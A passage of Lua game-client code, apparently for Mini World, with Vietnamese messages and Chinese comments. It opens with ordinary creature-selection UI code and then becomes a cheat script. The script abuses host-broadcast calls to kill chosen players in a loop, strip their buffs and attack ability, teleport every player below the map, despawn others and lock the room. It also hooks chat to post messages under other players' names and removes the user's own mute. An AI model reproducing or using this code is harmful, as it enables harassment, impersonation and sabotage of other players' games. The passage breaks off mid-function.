			Log("ERROR : uiFrame is nil")
		end
		if attributes[i].CanShow then
			frame:Show()
		else
			frame:Hide()
		end
		widgetIndex[attributes[i].Type] = widgetIndex[attributes[i].Type] + 1
	end
	if pointY < 516 then
		pointY = 516
	end
	getglobal("SingleCreateAttrBoxPlane"):SetHeight(pointY)
end

local function getTableByType(type)
	local defs = main.organismdefs
	for i = 1, #defs do
		if type == defs[i].Type then
			return defs[i].t
		end
	end
	return nil
end

function UpdateOrganismGridBox()
	if checkedHaloName then
		getglobal(checkedHaloName .. "Checked"):Hide()
	end
	getglobal("OrganismGridBox"):resetOffsetPos()
	local typeTable = getTableByType(curChooseType)
	if typeTable == nil then
		ShowGameTips(GetS(3758), 3)
		getglobal("ChooseOrganismFrame"):Hide()
		return
	end
	local num = #typeTable
	for i = 1, main.constants.MAX_ORGANISM_GRID_NUM do
		local grid = getglobal("OrganismGrid" .. i)
		if i <= num then
			grid:Show()
			grid:SetClientID(typeTable[i].ID)
			local icon = getglobal(grid:GetName() .. "Icon")
			setIcon(icon, typeTable[i])
		else
			grid:Hide()
		end
	end
	local height = 333 + math.ceil((num - 36) / 9) * 84
	if height < 333 then
		height = 333
	end
	getglobal("OrganismGridBoxPlane"):SetSize(755, height)
end

function SetChooseOrganismFrame()
	LoadOrganismDef()
	SetChooseOrganismFrameTab()
	UpdateOrganismGridBox()
	getglobal("ChooseOrganismFrame"):Show()
end

function SetChooseOrganismFrameTab()
	local defs = main.organismdefs
	for i = 1, main.constants.MAX_TAB_NUM do
		local tab = getglobal("ChooseOrganismFrameTabs" .. i)
		if tab then
			local name = getglobal("ChooseOrganismFrameTabs" .. i .. "Name")
			local normal = getglobal("ChooseOrganismFrameTabs" .. i .. "Normal")
			local checked = getglobal("ChooseOrganismFrameTabs" .. i .. "Checked")
			tab:SetClientID(i)
			if defs[i] and defs[i].Type == curChooseType then
				normal:Hide()
				checked:Show()
			else
				normal:Show()
				checked:Hide()
			end
			tab:Show()
			local type = defs[i].Type
			local nameStr = main.constants.TAB_NAME_STRING_ID[type]
			name:SetText(nameStr or "Phân loại" .. type)
		end
	end
end

function LoadOrganismDef()
	main.organismdefs = {}
	local defs = main.organismdefs
	for i = 1, #main.config.defaultMonsters do
		local one = main.config.defaultMonsters[i]
		for j = 1, #one.ID do
			local def = MonsterCsv:get(one.ID[j])
			if def then
				local t = getTableByType(one.Type)
				if t == nil then
					table.insert(defs, {Type = one.Type, t = {def}})
				else
					table.insert(t, def)
				end
			end
		end
	end
	table.sort(defs, function(a, b)
		return a.Type < b.Type
	end)
end

function CreateMonsterHelpBtn_OnClick()
	hideHelpBtn(3)
	local btn = main.config.helpButtons.SingleCreateSelection1HelpBtn
	local attr
	if next(btn.children) == nil then
		for i = 1, #btn.childName do
			btn.children[btn.childName[i]] = getglobal(btn.name .. btn.childName[i])
		end
	end
	setIcon(btn.children.Icon, curChooseMonsterDef)
	btn.children.Choose:SetText(curChooseMonsterDef.Name)
	local typeId = getType(curChooseMonsterDef.ID)
	local typeName = main.constants.TAB_NAME_STRING_ID[typeId] or "Phân loại không xác định"
	btn.children.Attribute:SetText(GetS(1107) .. GetS(8503) .. typeName)
	btn.children.Life:SetText(GetS(4300) .. GetS(8503) .. curChooseMonsterDef.Life)
	local atkpoint = 0
	if 0 <= curChooseMonsterDef.AttackType and curChooseMonsterDef.AttackType <= 2 then
		atkpoint = curChooseMonsterDef.Attacks[curChooseMonsterDef.AttackType]
	end
	btn.children.Attack:SetText(GetS(4302) .. GetS(8503) .. atkpoint)
	if tostring(curChooseMonsterDef.Desc) ~= "" then
		btn.children.Details:SetText(curChooseMonsterDef.Desc)
	else
		btn.children.Details:SetText(GetS(58))
	end
	if btn.children.Bkg and btn.children.Bkg:IsShown() then
		attr = btn.childrenAttr.closed
	else
		attr = btn.childrenAttr.opening
	end
	for i = 1, #attr do
		local fun = attr[i]
		local obj = getglobal(btn.name .. fun[2])
		if fun[1] == "point" then
			obj:SetPoint(fun[3], fun[4], fun[5], fun[6], fun[7])
		elseif fun[1] == "size" then
			obj:SetSize(fun[3], fun[4])
		elseif fun[1] == "strata" then
			obj:SetFrameStrataInt(fun[3])
		end
	end
	for i = 1, #btn.childName do
		local child = btn.children[btn.childName[i]]
		if child:IsShown() then
			child:Hide()
		else
			child:Show()
		end
	end
end

function SingleCreateFeatureHelpBtn_OnClick()
	local bkg, tips
	if string.find(this:GetName(), "Slider") then
		hideHelpBtn(1)
		bkg = getglobal("SingleCreateSlider2HelpBtnBkg")
		tips = getglobal("SingleCreateSlider2HelpBtnTips")
		if bkg:IsShown() then
			getglobal("SingleCreateSlider2HelpBtnNormal"):SetPoint("topleft", "SingleCreateSlider2HelpBtn", "topleft", 0, 0)
		else
			getglobal("SingleCreateSlider2HelpBtnNormal"):SetPoint("bottomright", "SingleCreateSlider2HelpBtn", "bottomright", 0, 0)
			this:SetSize(240, 200)
		end
	else
		hideHelpBtn(2)
		bkg = getglobal("SingleCreateSwitch1HelpBtnBkg")
		tips = getglobal("SingleCreateSwitch1HelpBtnTips")
		if bkg:IsShown() then
		else
			this:SetSize(220, 220)
		end
	end
	if bkg:IsShown() then
		bkg:Hide()
		tips:Hide()
		this:SetFrameStrataInt(4)
		this:SetSize(30, 31)
	else
		this:SetFrameStrataInt(5)
		bkg:Show()
		tips:Show()
	end
end

function CreateSliderTemplateLeftBtn_OnClick()
	hideHelpBtn()
	local value = getglobal(this:GetParent() .. "Bar"):GetValue()
	local index = this:GetParentFrame():GetClientID()
	local widget = main.config.widgetAttributes[index]
	value = value - widget.Step
	getglobal(this:GetParent() .. "Bar"):SetValue(value)
end

function CreateSliderTemplateBar_OnValueChanged()
	hideHelpBtn()
	local value = this:GetValue()
	local ratio = (value - this:GetMinValue()) / (this:GetMaxValue() - this:GetMinValue())
	if 1 < ratio then ratio = 1 end
	if ratio < 0 then ratio = 0 end
	local width = math.floor(183 * ratio)
	getglobal(this:GetName() .. "Pro"):ChangeTexUVWidth(width)
	getglobal(this:GetName() .. "Pro"):SetWidth(width)
	local index = this:GetParentFrame():GetClientID()
	local t = main.config.widgetAttributes[index]
	t.CurVal = value
	local valFont = getglobal(this:GetParent() .. "Val")
	if t.ValShowType then
		if t.ValShowType == "Int" then
			valFont:SetText(value)
		elseif t.ValShowType == "IntUnit" then
			valFont:SetText(value .. GetS(t.Unit_StringID))
		end
	end
end

function CreateSliderTemplateRightBtn_OnClick()
	hideHelpBtn()
	local value = getglobal(this:GetParent() .. "Bar"):GetValue()
	local index = this:GetParentFrame():GetClientID()
	local widget = main.config.widgetAttributes[index]
	value = value + widget.Step
	getglobal(this:GetParent() .. "Bar"):SetValue(value)
end

function CreateSelBtnTemplate_OnClick()
	if getglobal("SingleCreateSelection1HelpBtnBkg"):IsShown() then
		CreateMonsterHelpBtn_OnClick()
	end
	hideHelpBtn()
	SetChooseOrganismFrame()
end

function CreateSwitchTemplateBtn_OnClick(swithcName, state)
	hideHelpBtn()
	local switch = getglobal(swithcName)
	local index = switch:GetParentFrame():GetClientID()
	local widget = main.config.widgetAttributes[index]
	state = state == 1
	widget.CurVal = state
	if state then
		main.config.widgetAttributes[index + 1].CanShow = true
	else
		main.config.widgetAttributes[index + 1].CanShow = false
	end
	UpdateCreateMonsterFrame()
end
end

function hzwj()
local myUin = AccountManager:getUin()
local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
for i = 1, size do
    local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)  -- 修正索引
    if targetPlayer then
        local targetUin = targetPlayer:getUin()
        if targetUin ~= myUin then
            local size = 100
            local color = 0xff0000
            local id = 10230 + i  -- 使 ID 唯一

            local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
            local new_x = x / 100
            local new_y = y / 100 + 90
            local new_z = z / 100

            GraphicsManager:createGraphicsLine(3, 0, targetUin, 0, 0, 0, size, color, id, new_x, new_y, new_z)
        end
    end
end
end

function sdsj()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập số hợp lệ (giá trị thời gian)")
            return
        end
        local tdata = {
            [1] = "gamerule",
            [2] = "setTimLocked",
            [3] = { value }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end)
end

-- 待机动作
function djdz()
    for a = 0, 100000 do
        threadpool:wait(3.0)
        CurMainPlayer:playAct(100210)
    end
end

-- 创造爆爆蛋
function czbbd()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, y / 100, z / 100
    local tdata = {
        [1] = "world",
        [2] = "spawnMob",
        [3] = { new_x, new_y, new_z, 3109, 5, true }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

-- 防止崩溃
function fzbk()
    local BeInvitePanelCtrl, BeInvitePanelModel, BeInvitePanelView = GetInst("MiniUIManager"):GetMVC("BeInvitePanelAutoGen")
    local function BlockInviteEvent()
        ShowGameTipsWithoutFilter("Thông báo: đã chặn gây treo")
    end
    
    function ShowActorInvite(isInvite) BlockInviteEvent() end
    
    function BeInvitePanelView:InitMessage(content)
        self.title_label:setText("")
        GetInst("MiniUIManager"):CloseUI("BeInvitePanelAutoGen")
        BlockInviteEvent()
    end
end

-- 防止传送
function ycbr()
    function startMapTeleport(AAA) end
end

function xgcm()
ShowTextInputSafe(function(text)
        AccountManager:requestModifyRole(text, 2, 0,false);
    end)
end

function zdtx()
PlayerCenterFrameHeadChange_OnClick(1);
end

function qcwp()
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local new_x, new_y, new_z = x / 100, y / 100, z / 100

-- 计算范围：从主体位置到周围1000格（游戏内单位）
local range = 1000
local tdata = {
    [1] = "world",
    [2] = "despawnItemByBox",
    [3] = {
        new_x - range, new_y - range, new_z - range,  -- 最小点
        new_x + range, new_y + range, new_z + range   -- 最大点
    }
}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end


function zxyj()
    for a = 0, 1000000 do
        threadpool:wait(0.1)
getglobal("AccRideChangeBtn"):Show()
getglobal("AccRideChangeBtn"):SetPoint("right", "AccRideCallBtn", "left", -75, 0)
end
end

function pmwz()
ShowTextInputSafe(function(text)
        tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "createTimer";
    tdata[3] = {""}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "showTimerTips";
    tdata[3] = {{0},1,text,true}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end)
end

function kqqx()
local nameList = { 1, 2, 4, 8, 16,32, 256,512,2048}
        for _, enchantId in ipairs(nameList) do

tdata = {}
    tdata[1] = "player";
    tdata[2] = "setActionAttrState";
    tdata[3] = {AccountManager:getUin(),enchantId,true}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end
end

function wsjy()
PermitsCallModuleScript("setSpamPreventionMinutes",0)
PermitsCallModuleScript("setPlayerGamePermits", 0, AccountManager:getUin(), CS_PERMIT_MUTE, false)
PermitsCallModuleScript("setPlayerMute", AccountManager:getUin())
end


function qhrb()
local country = "JP"
gFunc_setCountry(country)
gFunc_setCountryIP(country)
ShowGameTipsWithoutFilter("Đã chuyển sang khu vực Nhật Bản, mọi người hãy cùng chiến đấu đến khi khu vực Nhật không còn ai")
end

function jjsc()
BanItem(CurMainPlayer:getCurToolID());
	getglobal("MItemTipsFrame"):Hide()
	end
	
	
	
	function mczbj()
	function MapEdit_OnUse(player, world, x, y, z, dir)
local isStartMapEdit = MapEditManager:GetIsStartEdit()
			if not isStartMapEdit then 
				local param = {disableOperateUI = true}
				-- GetInst("UIManager"):Open("MapEdit", param)
				if not GetInst("MiniUIManager"):IsShown("MapEditAutoGen") then
					GetInst("MiniUIManager"):OpenUI("MapEditMainFrame", "miniui/miniworld/ugc_mapEdit", "MapEditAutoGen", param)
				end
				standReportEvent("2001", "MINI_MINEMAP_GAME_1", "", "develop_terraineditor")
			else
				MapEditManager:ExcuteCmdWithRBClicked()
                -- if GetInst("UIManager"):GetCtrl("MapEdit") then
                --     GetInst("UIManager"):GetCtrl("MapEdit"):MapEditUseStatistics()
                -- end
				if GetInst("MiniUIManager"):GetCtrl("MapEdit") then
					GetInst("MiniUIManager"):GetCtrl("MapEdit"):MapEditUseStatistics()
				end
			end
end
end

function jqsw()
local pickedActor = CurMainPlayer:GetPickActor()
local commonNameList = {
    "ice_qicaihua_01", "bossblock_room","aotu_06_leishenzhichui","jiguang01"
}

if pickedActor then
    local objid = pickedActor:getObjId()
    local objType = pickedActor:getObjType()
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,5200000001314,1}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,5200000001314,2}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,520000001314,17}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,5200000001314,18}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,5,21}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    for i = 1, #commonNameList do
    local tdata = {
        [1] = "actor",
        [2] = "playBodyEffectByFile",
        [3] = {objid,commonNameList[i], true}
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    tdata = {}
    tdata[1] = "actor";
    tdata[2] = "changeCustomModel";
    tdata[3] = {objid,[=[skin_38]=]}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "actor";
    tdata[2] = "setnickname";
    tdata[3] = {objid,"#b#RThiên binh thiên tướng"}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    
    end
    end
    end
    

function wjzxms()

GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

-- 单体秒杀功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng hạ gục tức thì\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止秒杀 =====
            _G.dtms_enabled = false
            ShowGameTipsWithoutFilter("Đã dừng hạ gục tức thì")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启秒杀 =====
            _G.dtms_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("Hãy vào phòng game trước")
                _G.dtms_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("Phòng hiện tại không có người chơi khác")
                _G.dtms_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu hạ gục tức thì",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần hạ gục tức thì")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu hạ gục tức thì")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---
                if whitelist[targetUin] then
                    ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
                    _G.dtms_enabled = false  -- 停止本次秒杀
                    return
                end
                ---=== 白名单检查结束 ===---
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu vòng lặp hạ gục tức thì")
                
                -- 启动秒杀循环
                threadpool:work(function()
                local pickedActor = CurMainPlayer:GetPickActor()
                        if pickedActor then
                            local objid = pickedActor:getObjId()
                            local objType = pickedActor:getObjType()
                    local myUin = AccountManager:getUin()
                    local loopCount = 0
                    
                    while _G.dtms_enabled do
                        loopCount = loopCount + 1
                        
                        -- 每10次重新施加禁止攻击（防止被清除）
                        if loopCount % 10 == 1 then
                            local keepDisable = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {objid, 32, false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable)
                            end)
                        end
                        
                        -- 强制打开箱子UI
                        local forceBoxUI = {
                            [1] = "player",
                            [2] = "forceOpenBoxUI",
                            [3] = {objid, 797}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, forceBoxUI)
                        end)
                        
                        -- 修改昵称
                        local changeName = {
                            [1] = "actor",
                            [2] = "setnickname",
                            [3] = {objid, '#RChó'}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, changeName)
                        end)
                        
                        -- 修改模型
                        local changeModel = {
                            [1] = "actor",
                            [2] = "changeCustomModel",
                            [3] = {objid, "mob_3407"}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, changeModel)
                        end)
                        
                        -- 禁止攻击
                        local disableAttack = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {objid, 32, false}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                        end)
                        
                        -- ===== 设置目标为可攻击状态 =====
                        local setAttackable = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {objid, 64, true}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttackable)
                        end)
                        -- ================================
                        
                        -- ===== 清除目标无敌buff =====
                        local clearBuff = {
                            [1] = "buff",
                            [2] = "clearAllBuff",
                            [3] = {objid}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff)
                        end)
                        -- ===========================
                        
                        -- 播放特效1
                        local effect1 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {objid, "jiguang01", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, effect1) 
                        end)
                        
                        -- 播放特效2
                        local effect2 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {objid, "aotu_06_leishenzhichui", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, effect2) 
                        end)
                        
                        -- 设置属性
                        local setAttr1 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {objid, 1, 1}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttr1) 
                        end)
                        
                        local setAttr2 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {objid, 1, 2}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttr2) 
                        end)
                        
                        -- 造成伤害
                        
                            
                            local hurt = {
                                [1] = "actor",
                                [2] = "playerHurt",
                                [3] = {targetUin, objid, 1.8e+308, 0}  -- 修正：使用 targetUin
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, hurt) 
                            end)
                       
                        
                        -- 每10次显示一次提示
                        if loopCount % 10 == 0 then
                            ShowGameTipsWithoutFilter("#c00ffffĐã tấn công " .. loopCount .. " lần")
                        end
                        
                        threadpool:wait(0.0001)  -- 修正等待时间
                    end
                    
                    -- ===== 秒杀结束后恢复目标的攻击能力 =====
                    local enableAttack = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = {objid, 32, true}
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                        ShowGameTipsWithoutFilter("#c00ff00Đã khôi phục khả năng tấn công của mục tiêu")
                    end)
                    -- ====================================
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp hạ gục tức thì kết thúc, tổng số lần tấn công " .. loopCount .. " lần")
                end
                end)  -- 结束 threadpool:work
            end  -- 结束 ctrl:EnterFriendHomeBtn_OnClick
        end  -- 结束 elseif
    end  -- 结束 function(userData, btnType)
)  -- 结束 dualBtnBox
end


function zxph()
InitGameAPI()
GameVmTriggerInit()
local playerUin = AccountManager:getUin()

-- 获取准心位置
local ret, posx, posy, posz = GameVM.Player:getAimPos(playerUin)

if ret == ErrorCode.OK then
    -- 准心位置转换为方块坐标
    local centerX = math.floor(posx)
    local centerY = math.floor(posy)
    local centerZ = math.floor(posz)
    
    ShowGameTipsWithoutFilter("#c00ff00Tâm ngắm chỉ tới: " .. centerX .. ", " .. centerY .. ", " .. centerZ)
    ShowGameTipsWithoutFilter("#cFFAA00Phá khu vực 3x3")
    
    -- 破坏3x3区域内的方块
    for dx = -1, 1 do
        for dy = -1, 1 do
            for dz = -1, 1 do
                local blockX = centerX + dx
                local blockY = centerY + dy
                local blockZ = centerZ + dz
                
                local tdata = {
                    [1] = "block",
                    [2] = "destroyBlock",
                    [3] = { blockX, blockY, blockZ, false }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                threadpool:wait(0.01)  -- 稍微延迟，避免发送过快
            end
        end
    end
else
    ShowGameTipsWithoutFilter("#cFF0000Không thể lấy vị trí tâm ngắm")
end
end
function qtxk()
if ClientCurGame:isInGame() and CurWorld and CurWorld:getOWID() and AccountManager:getMultiPlayer() > 0 then
            local num = ClientCurGame:getNumPlayerBriefInfo()
            for i = 1, num do
                local briefInfo = ClientCurGame:getPlayerBriefInfo(i-1)
                if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                    local new_x = x / 100
                    local new_y = y / 100
                    local new_z = z / 100
                    tdata = {}
                    tdata[1] = "player";
                    tdata[2] = "setPosition";
                    tdata[3] = {briefInfo.uin,new_x,-99,new_z}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)   
                end
            end
        end
        end


function yfgb()
tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "createTimer";
    tdata[3] = {""}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "startBackwardTimer";
    tdata[3] = {1,5,false}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "showTimerTips";
    tdata[3] = {{0},1,[=[#RPhòng sắp đóng:#B]=],true}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
ShowGameTipsWithoutFilter("OK")


threadpool:wait(5.0)  -- 在协程中等待
 local myUin = AccountManager:getUin()
    
    -- 获取所有玩家并遍历
    local playerCount = ClientCurGame:requireArrayOfAllPlayers()
    for i = 1, playerCount do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
        -- 清除目标玩家
        local removeData = {
            [1] = "world",
            [2] = "despawnActor",
            [3] = { targetUin }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, removeData)
        
        tdata = {}
    tdata[1] = "gamerule";
    tdata[2] = "setAllowMidwayJoin";
    tdata[3] = {0}
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
    end
    end
    end

-- ==================== 模仿发言相关 ====================
local nicknameCache = {}

function getNickname(uin)
    if nicknameCache[uin] then return nicknameCache[uin] end
    
    local nickname = nil
    if ClientCurGame and ClientCurGame:isInGame() and CurWorld and CurWorld:getOWID() then
        local num = ClientCurGame:getNumPlayerBriefInfo() or 0
        for i = 1, num do
            local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
            if briefInfo and briefInfo.uin == uin and briefInfo.uin > 1000 and briefInfo.nickname then
                nickname = briefInfo.nickname
                break
            end
        end
    end
    
    if not nickname and GameVM and GameVM.Player then
        local _, wjmc11 = GameVM.Player:getNickname(uin)
        nickname = wjmc11 or nil
    end
    
    if nickname then nicknameCache[uin] = nickname end
    return nickname
end

function ClearNicknameCache()
    nicknameCache = {}
    ShowGameTipsWithoutFilter("Đã xóa bộ nhớ đệm biệt danh, sẽ lấy lại biệt danh người chơi")
end

function MffyByPlayerUin(Uin, Text)
    if not Uin or tonumber(Uin) <= 1000 then
        ShowGameTipsWithoutFilter("#cff0000UIN mô phỏng không hợp lệ, hãy chọn lại!")
        _G.customImitateUin = nil
        return
    end
    
    Text = tostring(Text or "")
    if Text == "" then
        ShowGameTipsWithoutFilter("#cff0000Nội dung phát biểu không được để trống!")
        return
    end
    
    local playerName = getNickname(Uin)
    if not playerName then
        ShowGameTipsWithoutFilter("#cff0000Người chơi đã chọn không tồn tại, không thể phát sóng!")
        _G.customImitateUin = nil
        return
    end
    
    trigger()
    
    if not ScriptSupportTask or not ScriptSupportTask.reportTaskToHost or not SSTASKID then
        ShowGameTipsWithoutFilter("#cff0000Thiếu giao diện phát sóng, không thể gửi tin nhắn!")
        return
    end
    
    local tdata = {
        [1] = "chat",
        [2] = "sendChat",
        [3] = { "#L" .. playerName .. "#n：#n#cffffff" .. Text, 1, 0 }
    }
    pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) end)
end

function SetImitateUin(newUin)
    local validUin = tonumber(newUin) or 0
    local selfUin = AccountManager and AccountManager.getUin and AccountManager:getUin() or 0
    
    if validUin <= 1000 then
        ShowGameTipsWithoutFilter("#cff0000UIN người chơi không hợp lệ! Phải lớn hơn 1000")
        return
    end
    
    if whitelist[validUin] then
        ShowGameTipsWithoutFilter("Cấm mô phỏng phát ngôn của người chơi VIP", 3)
        return
    end
    
    local playerName = getNickname(validUin)
    if not playerName then
        ShowGameTipsWithoutFilter("#cff0000Người chơi không tồn tại!")
        return
    end
    
    trigger()
    
    if ClientCurGame and ClientCurGame.sendChat and not _G._IsSendChatHooked then
        ClientCurGame.sendChat = function(self, ...)
            local args = {...}
            local Text = tostring(args[1] or "")
            MffyByPlayerUin(_G.customImitateUin, Text)
        end
        _G._IsSendChatHooked = true
    end
    
    _G.customImitateUin = validUin
    if validUin == selfUin then
        ShowGameTipsWithoutFilter("Đã khôi phục phát ngôn của bản thân")
    else
        ShowGameTipsWithoutFilter(playerName .. "#c00ffff Đã chuyển sang mô phỏng phát ngôn của người chơi này (có hiệu lực ngay)")
    end
end

-- 模仿发言
function fzbr()
    _G.customImitateUin = nil
    _G._IsSendChatHooked = false
    
    if ClientCurGame and ClientCurGame.sendChat and not _G._IsSendChatHooked then
        ClientCurGame.sendChat = function(self, ...)
            local args = {...}
            local Text = tostring(args[1] or "")
            MffyByPlayerUin(_G.customImitateUin, Text)
        end
        _G._IsSendChatHooked = true
        ShowGameTipsWithoutFilter("Chặn trò chuyện đã có hiệu lực, hãy chọn người chơi cần mô phỏng từ danh sách thành viên phòng")
    else
        ShowGameTipsWithoutFilter("#cff0000Khởi tạo chặn trò chuyện thất bại! Không tìm thấy giao diện sendChat")
    end
    
    ShowPlayerList(function(uin) SetImitateUin(uin) end, "Mô phỏng phát ngôn")
end

-- 关闭模仿发言
function gbmf()
    _G.customImitateUin = AccountManager:getUin()
    SetImitateUin(AccountManager:getUin())
    ShowGameTipsWithoutFilter("Đã khôi phục phát ngôn của bản thân")
end

-- ==================== 改名框功能封装 ====================
function ShowTextInputSafe(callback, title)
    -- 备份原有按钮回调函数
    local oldModify = NickModifyFrameModifyBtn_OnClick
    local oldModifyAbroad = NickModifyFrameModifyBtn_OnClickCallbackAbroad
    local oldCancel = CancelNickBtn_OnClick

    -- 打开输入弹窗
    getglobal("NickModifyFrame"):Show()

    -- 设置弹窗标题
    local titleCtrl = getglobal("NickModifyFrameTitle")
    if titleCtrl and titleCtrl.setText then
        titleCtrl:setText(title or "Nhập văn bản")
    end

    -- 获取输入框控件，清除原生字数限制
    local editBox = getglobal("NickModifyFrameContentNameEdit")
    if editBox and editBox.setMaxChar then
        -- 直接拉到超大值，不做复原
        editBox:setMaxChar(999999)
    end

    -- 还原原始函数（只恢复按钮事件，不再重置输入框字符限制）
    local function restoreOriginalFunc()
